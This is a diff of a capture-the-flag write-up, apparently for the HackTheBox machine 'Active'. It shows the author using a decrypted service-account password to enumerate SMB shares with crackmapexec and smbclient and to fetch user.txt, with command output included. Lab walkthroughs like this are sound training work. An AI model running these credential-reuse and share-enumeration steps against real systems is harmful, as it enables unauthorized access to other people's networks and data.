@@ -224,7 +224,81 @@ end
 blah = decrypt(encrypted_data)
 puts blah
 ```
-> With the decrypted password we can authenticate to the domain as the user SVG_TGS
+# USER.TXT
 
-# FOOT HOLD
 
+> With the decrypted password we can authenticate to the domain as user SVC_TGS
+
+```bash
+crackmapexec smb 10.129.4.34 -u "SVC_TGS" -p "xxxxxxxxxxxxxxxxx" --shares
+```
+
+```bash
+SMB         10.129.4.34     445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
+SMB         10.129.4.34     445    DC               [+] active.htb\SVC_TGS 
+SMB         10.129.4.34     445    DC               [+] Enumerated shares
+SMB         10.129.4.34     445    DC               Share           Permissions     Remark
+SMB         10.129.4.34     445    DC               -----           -----------     ------
+SMB         10.129.4.34     445    DC               ADMIN$                          Remote Admin
+SMB         10.129.4.34     445    DC               C$                              Default share
+SMB         10.129.4.34     445    DC               IPC$                            Remote IPC
+SMB         10.129.4.34     445    DC               NETLOGON        READ            Logon server share 
+SMB         10.129.4.34     445    DC               Replication     READ            
+SMB         10.129.4.34     445    DC               SYSVOL          READ            Logon server share 
+SMB         10.129.4.34     445    DC               Users           READ            
+```
+> Now we have read access to the `Users` share lets enumerate this share and see what we can find 
+
+```bash
+smbclient \\\\active.htb\\Users -I 10.129.4.34 -U "SVC_TGS"
+```
+
+```bash
+smb: \> dir
+  .                                  DR        0  Sat Jul 21 10:39:20 2018
+  ..                                 DR        0  Sat Jul 21 10:39:20 2018
+  Administrator                       D        0  Mon Jul 16 06:14:21 2018
+  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
+  Default                           DHR        0  Tue Jul 14 02:38:21 2009
+  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
+  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
+  Public                             DR        0  Tue Jul 14 00:57:55 2009
+  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018
+```
+
+```bash
+smb: \> cd SVC_TGS\
+smb: \SVC_TGS\> dir
+  .                                   D        0  Sat Jul 21 11:16:32 2018
+  ..                                  D        0  Sat Jul 21 11:16:32 2018
+  Contacts                            D        0  Sat Jul 21 11:14:11 2018
+  Desktop                             D        0  Sat Jul 21 11:14:42 2018
+  Downloads                           D        0  Sat Jul 21 11:14:23 2018
+  Favorites                           D        0  Sat Jul 21 11:14:44 2018
+  Links                               D        0  Sat Jul 21 11:14:57 2018
+  My Documents                        D        0  Sat Jul 21 11:15:03 2018
+  My Music                            D        0  Sat Jul 21 11:15:32 2018
+  My Pictures                         D        0  Sat Jul 21 11:15:43 2018
+  My Videos                           D        0  Sat Jul 21 11:15:53 2018
+  Saved Games                         D        0  Sat Jul 21 11:16:12 2018
+  Searches                            D        0  Sat Jul 21 11:16:24 2018
+```
+
+```bash
+smb: \SVC_TGS\> cd Desktop\
+smb: \SVC_TGS\Desktop\> dir
+  .                                   D        0  Sat Jul 21 11:14:42 2018
+  ..                                  D        0  Sat Jul 21 11:14:42 2018
+  user.txt                           AR       34  Sun Jan 29 16:48:37 2023
+```
+> Transfer file to our box
+
+```bash
+smb: \SVC_TGS\Desktop\> get user.txt
+getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/s
+```
+
+```bash
+nuke@nuker:~ cat user.txt 
+xxxxxxxxxxxxxxxxxx
+```
